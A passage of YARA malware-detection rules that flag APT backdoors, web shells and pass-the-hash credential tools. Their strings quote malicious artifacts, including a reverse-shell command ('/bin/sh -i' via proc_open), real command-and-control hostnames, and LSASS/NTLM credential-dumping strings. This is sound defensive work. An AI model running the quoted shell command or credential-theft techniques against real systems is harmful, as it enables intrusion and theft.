		$s1 = "$process = proc_open($shell, $descriptorspec, $pipes);" fullword ascii /* PEStudio Blacklist: strings */
		$s7 = "$shell = 'uname -a; w; id; /bin/sh -i';" fullword ascii /* PEStudio Blacklist: strings */
	condition:
		filesize < 10KB and all of them
}

rule Laudanum_Tools_Generic {
	meta:
		description = "Laudanum Injector Tools"
		author = "Florian Roth"
		reference = "http://laudanum.inguardians.com/"
		date = "2015-06-22"
		super_rule = 1
		hash0 = "076aa781a004ecb2bf545357fd36dcbafdd68b1a"
		hash1 = "885e1783b07c73e7d47d3283be303c9719419b92"
		hash2 = "01d5d16d876c55d77e094ce2b9c237de43b21a16"
		hash3 = "7421d33e8007c92c8642a36cba7351c7f95a4335"
		hash4 = "f49291aef9165ee4904d2d8c3cf5a6515ca0794f"
		hash5 = "c0dee56ee68719d5ec39e773621ffe40b144fda5"
		hash6 = "f32b9c2cc3a61fa326e9caebce28ef94a7a00c9a"
		hash7 = "dc5c03a21267d024ef0f5ab96a34e3f6423dfcd6"
		hash8 = "fd498c8b195967db01f68776ff5e36a06c9dfbfe"
		hash9 = "b50ae35fcf767466f6ca25984cc008b7629676b8"
		hash10 = "5570d10244d90ef53b74e2ac287fc657e38200f0"
		hash11 = "42bcb491a11b4703c125daf1747cf2a40a1b36f3"
		hash12 = "83e4eaaa2cf6898d7f83ab80158b64b1d48096f4"
		hash13 = "dec7ea322898690a7f91db9377f035ad7072b8d7"
		hash14 = "a2272b8a4221c6cc373915f0cc555fe55d65ac4d"
		hash15 = "588739b9e4ef2dbb0b4cf630b73295d8134cc801"
		hash16 = "43320dc23fb2ed26b882512e7c0bfdc64e2c1849"
	strings:
		$s1 = "***  laudanum@secureideas.net" fullword ascii
		$s2 = "*** Laudanum Project" fullword ascii
	condition:
		filesize < 60KB and all of them
}
rule EliseLotusBlossom
{
meta:
	author = "Jose Ramon Palanco"
	date = "2015-06-23"
	description = "Elise Backdoor Trojan"
	ref = "https://www.paloaltonetworks.com/resources/research/unit42-operation-lotus-blossom.html"

strings:
        $magic = { 4d 5a }
	$s1 = "\",Update" wide
	$s2 = "LoaderDLL.dll"
	$s3 = "Kernel32.dll"
	$s4 = "{5947BACD-63BF-4e73-95D7-0C8A98AB95F2}"
	$s5 = "\\Network\\" wide
	$s6 = "0SSSSS"
	$s7 = "441202100205"
	$s8 = "0WWWWW"
condition:
	$magic at 0 and all of ($s*)	
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/
rule MiniDionis_readerView {
	meta:
		description = "MiniDionis Malware - file readerView.exe / adobe.exe"
		author = "Florian Roth"
		reference = "http://www.kernelmode.info/forum/viewtopic.php?f=16&t=3950"
		date = "2015-07-20"
		/* Original Hash */
		hash1 = "ee5eb9d57c3611e91a27bb1fc2d0aaa6bbfa6c69ab16e65e7123c7c49d46f145"
		/* Derived Samples */
		hash2 = "a713982d04d2048a575912a5fc37c93091619becd5b21e96f049890435940004"
		hash3 = "88a40d5b679bccf9641009514b3d18b09e68b609ffaf414574a6eca6536e8b8f"
		hash4 = "97d8725e39d263ed21856477ed09738755134b5c0d0b9ae86ebb1cdd4cdc18b7"
		hash5 = "ed7abf93963395ce9c9cba83a864acb4ed5b6e57fd9a6153f0248b8ccc4fdb46"
		hash6 = "56ac764b81eb216ebed5a5ad38e703805ba3e1ca7d63501ba60a1fb52c7ebb6e"
	strings:
		$s1 = "%ws_out%ws" fullword wide /* score: '8.00' */
		$s2 = "dnlibsh" fullword ascii /* score: '7.00' */

		$op0 = { 0f b6 80 68 0e 41 00 0b c8 c1 e1 08 0f b6 c2 8b } /* Opcode */
		$op1 = { 8b ce e8 f8 01 00 00 85 c0 74 41 83 7d f8 00 0f } /* Opcode */
		$op2 = { e8 2f a2 ff ff 83 20 00 83 c8 ff 5f 5e 5d c3 55 } /* Opcode */
	condition:
		uint16(0) == 0x5a4d and filesize < 500KB and all of ($s*) and 1 of ($op*)
}

/* Related - SFX files or packed files with typical malware content -------- */

rule Malicious_SFX1 {
	meta:
		description = "SFX with voicemail content"
		author = "Florian Roth"
		reference = "http://www.kernelmode.info/forum/viewtopic.php?f=16&t=3950"
		date = "2015-07-20"
		hash = "c0675b84f5960e95962d299d4c41511bbf6f8f5f5585bdacd1ae567e904cb92f"
	strings:
		$s0 = "voicemail" ascii /* PEStudio Blacklist: strings */ /* score: '30.00' */
		$s1 = ".exe" ascii
	condition:
		uint16(0) == 0x4b50 and filesize < 1000KB and $s0 in (3..80) and $s1 in (3..80) 
}

rule Malicious_SFX2 {
	meta:
		description = "SFX with adobe.exe content"
		author = "Florian Roth"
		reference = "http://www.kernelmode.info/forum/viewtopic.php?f=16&t=3950"
		date = "2015-07-20"
		hash = "502e42dc99873c52c3ca11dd3df25aad40d2b083069e8c22dd45da887f81d14d"
	strings:
		$s1 = "adobe.exe" fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.00' */
		$s2 = "Extracting files to %s folder$Extracting files to tempomalware_rary folder" fullword wide /* PEStudio Blacklist: strings */ /* score: '26.00' */
		$s3 = "GETPASSWORD1" fullword wide /* PEStudio Blacklist: strings */ /* score: '23.00' */
	condition:
		uint16(0) == 0x5a4d and filesize < 1000KB and all of them
}

rule MiniDionis_VBS_Dropped {
	meta:
		description = "Dropped File - 1.vbs"
		author = "Florian Roth"
		reference = "https://malwr.com/analysis/ZDc4ZmIyZDI4MTVjNGY5NWI0YzE3YjIzNGFjZTcyYTY/"
		date = "2015-07-21"
		hash = "97dd1ee3aca815eb655a5de9e9e8945e7ba57f458019be6e1b9acb5731fa6646"
	strings:
		$s1 = "Wscript.Sleep 5000" ascii
		$s2 = "Set FSO = CreateObject(\"Scripting.FileSystemObject\")" ascii
		$s3 = "Set WshShell = CreateObject(\"WScript.Shell\")" ascii
		$s4 = "If(FSO.FileExists(\"" ascii
		$s5 = "then FSO.DeleteFile(\".\\" ascii
	condition:
		filesize < 1KB and all of them and $s1 in (0..40)
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule MirageStrings : Mirage Family
{
    meta:
        description = "Mirage Identifying Strings"
        author = "Seth Hardy"
        last_modified = "2014-06-25"
        
    strings:
        $ = "Neo,welcome to the desert of real." wide ascii
        $ = "/result?hl=en&id=%s"
        
    condition:
       any of them
}

rule Mirage : Family
{
    meta:
        description = "Mirage"
        author = "Seth Hardy"
        last_modified = "2014-06-25"
        
    condition:
        MirageStrings
}

rule Mirage_APT : APT Backdoor Rat
{
    meta:
        Author      = "Silas Cutler"
        Date        = "yyyy/mm/dd"
        Description = "Malware related to APT campaign"
        Reference   = "Useful link"
    
    strings:
        $a1 = "welcome to the desert of the real"
        $a2 = "Mirage"
        $b = "Encoding: gzip"
        $c = /\/[A-Za-z]*\?hl=en/

    condition: 
        (($a1 or $a2) or $b) and $c
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule Molerats_certs
{
    meta:
        Author      = "FireEye Labs"
        Date        = "2013/08/23"
        Description = "this rule detections code signed with certificates used by the Molerats actor"
        Reference   = "https://www.fireeye.com/blog/threat-research/2013/08/operation-molerats-middle-east-cyber-attacks-using-poison-ivy.html"

    strings:
        $cert1 = { 06 50 11 A5 BC BF 83 C0 93 28 16 5E 7E 85 27 75 }
        $cert2 = { 03 e1 e1 aa a5 bc a1 9f ba 8c 42 05 8b 4a bf 28 }
        $cert3 = { 0c c0 35 9c 9c 3c da 00 d7 e9 da 2d c6 ba 7b 6d }

    condition:
        1 of ($cert*)
}/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule Backdoor_APT_Mongal
{
meta:
	author = "@patrickrolsen"
	maltype = "Backdoor.APT.Mongall"
	version = "0.1"
	reference = "fd69a799e21ccb308531ce6056944842" 
	date = "01/04/2014"
strings:
	$author  = "author user"
	$title   = "title Vjkygdjdtyuj" nocase
	$comp    = "company ooo"
	$cretime = "creatim\\yr2012\\mo4\\dy19\\hr15\\min10"
	$passwd  = "password 00000000"
condition:
        all of them
}

rule MongalCode : Mongal Family 
{
    meta:
        description = "Mongal code features"
        author = "Seth Hardy"
        last_modified = "2014-07-15"
    
    strings:
        // gettickcount value checking
        $ = { 8B C8 B8 D3 4D 62 10 F7 E1 C1 EA 06 2B D6 83 FA 05 76 EB }
        
    condition:
        any of them
}

rule MongalStrings : Mongal Family
{
    meta:
        description = "Mongal Identifying Strings"
        author = "Seth Hardy"
        last_modified = "2014-07-15"
        
    strings:
        $ = "NSCortr.dll"
        $ = "NSCortr1.dll"
        $ = "Sina.exe"
        
    condition:
        any of them
}

rule Mongal : Family
{
    meta:
        description = "Mongal"
        author = "Seth Hardy"
        last_modified = "2014-07-15"
        
    condition:
        MongalCode or MongalStrings
}


/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule APT_NGO_wuaclt
{
   meta:
    author = "AlienVault Labs"
  strings:
    $a = "%%APPDATA%%\\Microsoft\\wuauclt\\wuauclt.dat"
    $b = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
    $c = "/news/show.asp?id%d=%d"
    
	$d = "%%APPDATA%%\\Microsoft\\wuauclt\\"
	$e = "0l23kj@nboxu"
	
	$f = "%%s.asp?id=%%d&Sid=%%d"
	$g = "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SP Q%%d)"
	$h = "Cookies: UseID=KGIOODAOOK%%s"

  condition:
    ($a and $b and $c) or ($d and $e) or ($f and $g and $h)
}

rule APT_NGO_wuaclt_PDF
{
    	meta:
        	author = "AlienVault Labs"

	strings:
		$pdf  = "%PDF" nocase
		$comment = {3C 21 2D 2D 0D 0A 63 57 4B 51 6D 5A 6C 61 56 56 56 56 56 56 56 56 56 56 56 56 56 63 77 53 64 63 6A 4B 7A 38 35 6D 37 4A 56 6D 37 4A 46 78 6B 5A 6D 5A 6D 52 44 63 5A 58 41 73 6D 5A 6D 5A 7A 42 4A 31 79 73 2F 4F 0D 0A}
	
	condition:
		$pdf at 0 and $comment in (0..200)
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

rule APT_OLE_JSRat
{
meta:
	author = "Rahul Mohandas"
	Date = "2015-06-16"
	Description = "Targeted attack using Excel/word documents"
strings:
	$header = {D0 CF 11 E0 A1 B1 1A E1}
	$key1 = "AAAAAAAAAA"
	$key2 = "Base64Str" nocase
	$key3 = "DeleteFile" nocase
	$key4 = "Scripting.FileSystemObject" nocase
condition:
	$header at 0 and (all of ($key*) )
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule ZhoupinExploitCrew
{
  meta:
    author = "Cylance"
    date = "2014-12-02"
    description = "http://cylance.com/opcleaver"
  strings:
  	$s1 = "zhoupin exploit crew" nocase
    $s2 = "zhopin exploit crew" nocase
  condition:
  	1 of them
}

rule BackDoorLogger
{
  meta:
    author = "Cylance"
    date = "2014-12-02"
    description = "http://cylance.com/opcleaver"
  strings:
    $s1 = "BackDoorLogger"
    $s2 = "zhuAddress"
  condition:
    all of them
}

rule Jasus
{
  meta:
    author = "Cylance"
    date = "2014-12-02"
    description = "http://cylance.com/opcleaver"
  strings:
    $s1 = "pcap_dump_open"
    $s2 = "Resolving IPs to poison..."
    $s3 = "WARNNING: Gateway IP can not be found"
  condition:
    all of them
}

rule LoggerModule
{
  meta:
    author = "Cylance"
    date = "2014-12-02"
    description = "http://cylance.com/opcleaver"
  strings:
    $s1 = "%s-%02d%02d%02d%02d%02d.r"
    $s2 = "C:\\Users\\%s\\AppData\\Cookies\\"
  condition:
    all of them
}

rule NetC
{
  meta:
    author = "Cylance"
    date = "2014-12-02"
    description = "http://cylance.com/opcleaver"
  strings:
    $s1 = "NetC.exe" wide
    $s2 = "Net Service"
  condition:
    all of them
}

rule ShellCreator2
{
  meta:
    author = "Cylance"
    date = "2014-12-02"
    description = "http://cylance.com/opcleaver"
  strings:
    $s1 = "ShellCreator2.Properties"
    $s2 = "set_IV"
  condition:
    all of them
}

rule SmartCopy2
{
  meta:
    author = "Cylance"
    date = "2014-12-02"
    description = "http://cylance.com/opcleaver"
  strings:
    $s1 = "SmartCopy2.Properties"
    $s2 = "ZhuFrameWork"
  condition:
    all of them
}

rule SynFlooder
{
  meta:
    author = "Cylance"
    date = "2014-12-02"
    description = "http://cylance.com/opcleaver"
  strings:
    $s1 = "Unable to resolve [ %s ]. ErrorCode %d"
    $s2 = "your target's IP is : %s"
    $s3 = "Raw TCP Socket Created successfully."
  condition:
    all of them
}

rule TinyZBot
{
  meta:
    author = "Cylance"
    date = "2014-12-02"
    description = "http://cylance.com/opcleaver"
  strings:
    $s1 = "NetScp" wide
    $s2 = "TinyZBot.Properties.Resources.resources"

    $s3 = "Aoao WaterMark"
    $s4 = "Run_a_exe"
    $s5 = "netscp.exe"

    $s6 = "get_MainModule_WebReference_DefaultWS"
    $s7 = "remove_CheckFileMD5Completed"
    $s8 = "http://tempuri.org/"

    $s9 = "Zhoupin_Cleaver"
  condition:
    ($s1 and $s2) or ($s3 and $s4 and $s5) or ($s6 and $s7 and $s8) or ($s9)
}

rule antivirusdetector
{
  meta:
    author = "Cylance"
    date = "2014-12-02"
    description = "http://cylance.com/opcleaver"
	strings:
		$s1 = "getShadyProcess"
		$s2 = "getSystemAntiviruses"
		$s3 = "AntiVirusDetector"
	condition:
		all of them
}

rule csext
{
  meta:
    author = "Cylance"
    date = "2014-12-02"
    description = "http://cylance.com/opcleaver"
  strings:
    $s1 = "COM+ System Extentions"
    $s2 = "csext.exe"
    $s3 = "COM_Extentions_bin"
  condition:
    all of them
}

rule kagent
{
  meta:
    author = "Cylance"
    date = "2014-12-02"
    description = "http://cylance.com/opcleaver"
  strings:
    $s1 = "kill command is in last machine, going back"
    $s2 = "message data length in B64: %d Bytes"
  condition:
    all of them
}

rule mimikatzWrapper
{
  meta:
    author = "Cylance"
    date = "2014-12-02"
    description = "http://cylance.com/opcleaver"
  strings:
    $s1 = "mimikatzWrapper"
    $s2 = "get_mimikatz"
  condition:
    all of them
}

rule pvz_in
{
  meta:
    author = "Cylance"
    date = "2014-12-02"
    description = "http://cylance.com/opcleaver"
  strings:
    $s1 = "LAST_TIME=00/00/0000:00:00PM$"
    $s2 = "if %%ERRORLEVEL%% == 1 GOTO line"
  condition:
    all of them
}

rule pvz_out
{
  meta:
    author = "Cylance"
    date = "2014-12-02"
    description = "http://cylance.com/opcleaver"
  strings:
    $s1 = "Network Connectivity Module" wide
    $s2 = "OSPPSVC" wide
  condition:
    all of them
}

rule wndTest
{
  meta:
    author = "Cylance"
    date = "2014-12-02"
    description = "http://cylance.com/opcleaver"
  strings:
    $s1 = "[Alt]" wide
    $s2 = "<< %s >>:" wide
    $s3 = "Content-Disposition: inline; comp=%s; account=%s; product=%d;"
  condition:
    all of them
}

rule zhCat
{
  meta:
    author = "Cylance"
    date = "2014-12-02"
    description = "http://cylance.com/opcleaver"
  strings:
    $s1 = "zhCat -l -h -tp 1234"
    $s2 = "ABC ( A Big Company )" wide
  condition:
    all of them
}

rule zhLookUp
{
  meta:
    author = "Cylance"
    date = "2014-12-02"
    description = "http://cylance.com/opcleaver"
  strings:
    $s1 = "zhLookUp.Properties"
  condition:
    all of them
}

rule zhmimikatz
{
  meta:
    author = "Cylance"
    date = "2014-12-02"
    description = "http://cylance.com/opcleaver"
  strings:
    $s1 = "MimikatzRunner"
    $s2 = "zhmimikatz"
  condition:
    all of them
}

rule Zh0uSh311
{
  meta:
    author = "Cylance"
    date = "2014-12-02"
    description = "http://cylance.com/opcleaver"
  strings:
  	$s1 = "Zh0uSh311"
  condition:
  	all of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/
rule whosthere_alt {
	meta:
		description = "Auto-generated rule - file whosthere-alt.exe"
		author = "Florian Roth"
		reference = "http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit"
		date = "2015-07-10"
		score = 80
		hash = "9b4c3691872ca5adf6d312b04190c6e14dd9cbe10e94c0dd3ee874f82db897de"
	strings:
		$s0 = "WHOSTHERE-ALT v1.1 - by Hernan Ochoa (hochoa@coresecurity.com, hernan@gmail.com) - (c) 2007-2008 Core Security Technologies" fullword ascii /* PEStudio Blacklist: strings */ /* score: '49.00' */
		$s1 = "whosthere enters an infinite loop and searches for new logon sessions every 2 seconds. Only new sessions are shown if found." fullword ascii /* PEStudio Blacklist: strings */ /* score: '36.00' */
		$s2 = "dump output to a file, -o filename" fullword ascii /* PEStudio Blacklist: strings */ /* score: '30.00' */
		$s3 = "This tool lists the active LSA logon sessions with NTLM credentials." fullword ascii /* PEStudio Blacklist: strings */ /* score: '29.00' */
		$s4 = "Error: pth.dll is not in the current directory!." fullword ascii /* score: '24.00' */
		$s5 = "the output format is: username:domain:lmhash:nthash" fullword ascii /* PEStudio Blacklist: strings */ /* score: '17.00' */
		$s6 = ".\\pth.dll" fullword ascii /* score: '16.00' */
		$s7 = "Cannot get LSASS.EXE PID!" fullword ascii /* score: '14.00' */
	condition:
		uint16(0) == 0x5a4d and filesize < 280KB and 2 of them
}

rule iam_alt_iam_alt {
	meta:
		description = "Auto-generated rule - file iam-alt.exe"
		author = "Florian Roth"
		reference = "http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit"
		date = "2015-07-10"
		score = 80
		hash = "2ea662ef58142d9e340553ce50d95c1b7a405672acdfd476403a565bdd0cfb90"
	strings:
		$s0 = "<cmd>. Create a new logon session and run a command with the specified credentials (e.g.: -r cmd.exe)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '59.00' */
		$s1 = "IAM-ALT v1.1 - by Hernan Ochoa (hochoa@coresecurity.com, hernan@gmail.com) - (c) 2007-2008 Core Security Technologies" fullword ascii /* PEStudio Blacklist: strings */ /* score: '43.00' */
		$s2 = "This tool allows you to change the NTLM credentials of the current logon session" fullword ascii /* PEStudio Blacklist: strings */ /* score: '31.00' */
		$s3 = "username:domainname:lmhash:nthash" fullword ascii /* PEStudio Blacklist: strings */ /* score: '15.00' */
		$s4 = "Error in cmdline!. Bye!." fullword ascii /* score: '12.00' */
		$s5 = "Error: Cannot open LSASS.EXE!." fullword ascii /* score: '12.00' */
		$s6 = "nthash is too long!." fullword ascii /* score: '8.00' */
		$s7 = "LSASS HANDLE: %x" fullword ascii /* score: '5.00' */
	condition:
		uint16(0) == 0x5a4d and filesize < 240KB and 2 of them
}

rule genhash_genhash {
	meta:
		description = "Auto-generated rule - file genhash.exe"
		author = "Florian Roth"
		reference = "http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit"
		date = "2015-07-10"
		score = 80
		hash = "113df11063f8634f0d2a28e0b0e3c2b1f952ef95bad217fd46abff189be5373f"
	strings:
		$s1 = "genhash.exe <password>" fullword ascii /* PEStudio Blacklist: strings */ /* score: '30.00' */
		$s3 = "Password: %s" fullword ascii /* PEStudio Blacklist: strings */ /* score: '17.00' */
		$s4 = "%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X" fullword ascii /* score: '11.00' */
		$s5 = "This tool generates LM and NT hashes." fullword ascii /* score: '10.00' */
		$s6 = "(hashes format: LM Hash:NT hash)" fullword ascii /* score: '10.00' */
	condition:
		uint16(0) == 0x5a4d and filesize < 200KB and 2 of them
}

rule iam_iamdll {
	meta:
		description = "Auto-generated rule - file iamdll.dll"
		author = "Florian Roth"
		reference = "http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit"
		date = "2015-07-10"
		score = 80
		hash = "892de92f71941f7b9e550de00a57767beb7abe1171562e29428b84988cee6602"
	strings:
		$s0 = "LSASRV.DLL" fullword ascii /* score: '21.00' */
		$s1 = "iamdll.dll" fullword ascii /* score: '21.00' */
		$s2 = "ChangeCreds" fullword ascii /* score: '12.00' */
	condition:
		uint16(0) == 0x5a4d and filesize < 115KB and all of them
}

rule iam_iam {
	meta:
		description = "Auto-generated rule - file iam.exe"
		author = "Florian Roth"
		reference = "http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit"
		date = "2015-07-10"
		score = 80
		hash = "8a8fcce649259f1b670bb1d996f0d06f6649baa8eed60db79b2c16ad22d14231"
	strings:
		$s1 = "<cmd>. Create a new logon session and run a command with the specified credentials (e.g.: -r cmd.exe)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '59.00' */
		$s2 = "iam.exe -h administrator:mydomain:"  ascii /* PEStudio Blacklist: strings */ /* score: '40.00' */
		$s3 = "An error was encountered when trying to change the current logon credentials!." fullword ascii /* PEStudio Blacklist: strings */ /* score: '33.00' */
		$s4 = "optional parameter. If iam.exe crashes or doesn't work when run in your system, use this parameter." fullword ascii /* PEStudio Blacklist: strings */ /* score: '30.00' */
		$s5 = "IAM.EXE will try to locate some memory locations instead of using hard-coded values." fullword ascii /* score: '26.00' */
		$s6 = "Error in cmdline!. Bye!." fullword ascii /* score: '12.00' */
		$s7 = "Checking LSASRV.DLL...." fullword ascii /* score: '12.00' */
	condition:
		uint16(0) == 0x5a4d and filesize < 300KB and all of them
}

rule whosthere_alt_pth {
	meta:
		description = "Auto-generated rule - file pth.dll"
		author = "Florian Roth"
		reference = "http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit"
		date = "2015-07-10"
		score = 80
		hash = "fbfc8e1bc69348721f06e96ff76ae92f3551f33ed3868808efdb670430ae8bd0"
	strings:
		$s0 = "c:\\debug.txt" fullword ascii /* PEStudio Blacklist: strings */ /* score: '23.00' */
		$s1 = "pth.dll" fullword ascii /* score: '20.00' */
		$s2 = "\"Primary\" string found at %.8Xh" fullword ascii /* score: '7.00' */
		$s3 = "\"Primary\" string not found!" fullword ascii /* score: '6.00' */
		$s4 = "segment 1 found at %.8Xh" fullword ascii /* score: '6.00' */
	condition:
		uint16(0) == 0x5a4d and filesize < 240KB and 4 of them
}

rule whosthere {
	meta:
		description = "Auto-generated rule - file whosthere.exe"
		author = "Florian Roth"
		reference = "http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit"
		date = "2015-07-10"
		score = 80
		hash = "d7a82204d3e511cf5af58eabdd6e9757c5dd243f9aca3999dc0e5d1603b1fa37"
	strings:
		$s1 = "by Hernan Ochoa (hochoa@coresecurity.com, hernan@gmail.com) - (c) 2007-2008 Core Security Technologies" fullword ascii /* PEStudio Blacklist: strings */ /* score: '48.00' */
		$s2 = "whosthere enters an infinite loop and searches for new logon sessions every 2 seconds. Only new sessions are shown if found." fullword ascii /* PEStudio Blacklist: strings */ /* score: '36.00' */
		$s3 = "specify addresses to use. Format: ADDCREDENTIAL_ADDR:ENCRYPTMEMORY_ADDR:FEEDBACK_ADDR:DESKEY_ADDR:LOGONSESSIONLIST_ADDR:LOGONSES" ascii /* PEStudio Blacklist: strings */ /* score: '28.00' */
		$s4 = "Could not enable debug privileges. You must run this tool with an account with administrator privileges." fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.00' */
		$s5 = "-B is now used by default. Trying to find correct addresses.." fullword ascii /* PEStudio Blacklist: strings */ /* score: '15.00' */
		$s6 = "Cannot get LSASS.EXE PID!" fullword ascii /* score: '14.00' */
	condition:
		uint16(0) == 0x5a4d and filesize < 320KB and 2 of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule backdoor_apt_pcclient
{
meta:
	author = "@patrickrolsen"
	maltype = "APT.PCCLient"
	filetype = "DLL"
	version = "0.1"
	description = "Detects the dropper: 869fa4dfdbabfabe87d334f85ddda234 AKA dw20.dll/msacm32.drv dropped by 4a85af37de44daf5917f545c6fd03902 (RTF)"
	date = "2012-10"
strings:
	$magic = { 4d 5a } // MZ
	$string1 = "www.micro1.zyns.com"
	$string2 = "Mozilla/4.0 (compatible; MSIE 8.0; Win32)"
	$string3 = "msacm32.drv" wide
	$string4 = "C:\\Windows\\Explorer.exe" wide
	$string5 = "Elevation:Administrator!" wide
	$string6 = "C:\\Users\\cmd\\Desktop\\msacm32\\Release\\msacm32.pdb"
condition:
	$magic at 0 and 4 of ($string*)
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/
rule APT_Malware_PutterPanda_Rel {
	meta:
		description = "Detects an APT malware related to PutterPanda"
		author = "Florian Roth"
		score = 70
		reference = "VT Analysis"
		date = "2015-06-03"
		hash = "5367e183df155e3133d916f7080ef973f7741d34"
	strings:
		$x0 = "app.stream-media.net" fullword ascii /* score: '12.03' */
		$x1 = "File %s does'nt exist or is forbidden to acess!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '16.035' */

		$s6 = "GetProcessAddresss of pHttpQueryInfoA Failed!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '32.02' */
		$s7 = "Connect %s error!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '16.04' */
		$s9 = "Download file %s successfully!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '14.03' */
		$s10 = "index.tmp" fullword ascii /* score: '14.03' */
		$s11 = "Execute PE Successfully" fullword ascii /* PEStudio Blacklist: strings */ /* score: '13.03' */
		$s13 = "aa/22/success.xml" fullword ascii /* score: '12.005' */
		$s16 = "aa/22/index.asp" fullword ascii /* score: '11.02' */
		$s18 = "File %s a Non-Pe File" fullword ascii /* score: '8.04' */
		$s19 = "SendRequset error!" fullword ascii /* score: '8.04' */
		$s20 = "filelist[%d]=%s" fullword ascii /* score: '7.015' */
	condition:
		( uint16(0) == 0x5a4d and 1 of ($x*) ) or ( 4 of ($s*) )
}


rule APT_Malware_PutterPanda_Rel_2 {
	meta:
		description = "APT Malware related to PutterPanda Group"
		author = "Florian Roth"
		score = 70
		reference = "VT Analysis"
		date = "2015-06-03"
		hash = "f97e01ee04970d1fc4d988a9e9f0f223ef2a6381"
	strings:
		$s0 = "http://update.konamidata.com/test/zl/sophos/td/result/rz.dat?" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.01' */
		$s1 = "http://update.konamidata.com/test/zl/sophos/td/index.dat?" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.01' */
		$s2 = "Mozilla/4.0 (Compatible; MSIE 6.0;)" fullword ascii /* PEStudio Blacklist: agent */ /* score: '20.03' */
		$s3 = "Internet connect error:%d" fullword ascii /* PEStudio Blacklist: strings */ /* score: '14.035' */
		$s4 = "Proxy-Authorization:Basic" fullword ascii /* PEStudio Blacklist: strings */ /* score: '14.02' */
		$s5 = "HttpQueryInfo failed:%d" fullword ascii /* PEStudio Blacklist: strings */ /* score: '13.015' */
		$s6 = "read file error:%d" fullword ascii /* score: '11.04' */
		$s7 = "downdll.dll" fullword ascii /* score: '11.025' */
		$s8 = "rz.dat" fullword ascii /* score: '10.005' */
		$s9 = "Invalid url" fullword ascii /* PEStudio Blacklist: strings */ /* score: '9.03' */
		$s10 = "Create file failed" fullword ascii /* score: '8.045' */
		$s11 = "myAgent" fullword ascii /* score: '8.025' */
		$s12 = "%s%s%d%d" fullword ascii /* score: '8.005' */
		$s13 = "down file success" fullword ascii /* score: '7.035' */
		$s15 = "error!" fullword ascii /* score: '6.04' */
		$s18 = "Avaliable data:%u bytes" fullword ascii /* score: '5.025' */
	condition:
		uint16(0) == 0x5a4d and 6 of them
}

rule APT_Malware_PutterPanda_PSAPI {
	meta:
		description = "Detects a malware related to Putter Panda"
		author = "Florian Roth"
		score = 70
		reference = "VT Analysis"
		date = "2015-06-03"
		hash = "f93a7945a33145bb6c106a51f08d8f44eab1cdf5"
	strings:
		$s0 = "LOADER ERROR" fullword ascii /* PEStudio Blacklist: strings */ /* score: '12.03' */
		$s1 = "The procedure entry point %s could not be located in the dynamic link libmalware_rary %s" fullword ascii /* PEStudio Blacklist: strings */ /* score: '8.045' */
		$s2 = "psapi.dll" fullword ascii /* PEStudio Blacklist: strings */ /* score: '5' */ /* Goodware String - occured 54 times */
		$s3 = "urlmon.dll" fullword ascii /* PEStudio Blacklist: strings */ /* score: '5' */ /* Goodware String - occured 471 times */
		$s4 = "WinHttpGetProxyForUrl" fullword ascii /* PEStudio Blacklist: strings */ /* score: '5' */ /* Goodware String - occured 179 times */
	condition:
		uint16(0) == 0x5a4d and filesize < 300KB and all of them
}

rule APT_Malware_PutterPanda_WUAUCLT {
	meta:
		description = "Detects a malware related to Putter Panda"
		author = "Florian Roth"
		score = 70
		reference = "VT Analysis"
		date = "2015-06-03"
		hash = "fd5ca5a2d444865fa8320337467313e4026b9f78"
	strings:
		$x0 = "WUAUCLT.EXE" fullword wide /* PEStudio Blacklist: strings */ /* score: '20.01' */
		$x1 = "%s\\tmp%d.exe" fullword ascii /* score: '14.01' */	
		$x2 = "Microsoft Corporation. All rights reserved." fullword wide /* score: '8.04' */

		$s1 = "Microsoft Windows Operating System" fullword wide /* PEStudio Blacklist: strings */ /* score: '5' */ /* Goodware String - occured 4 times */
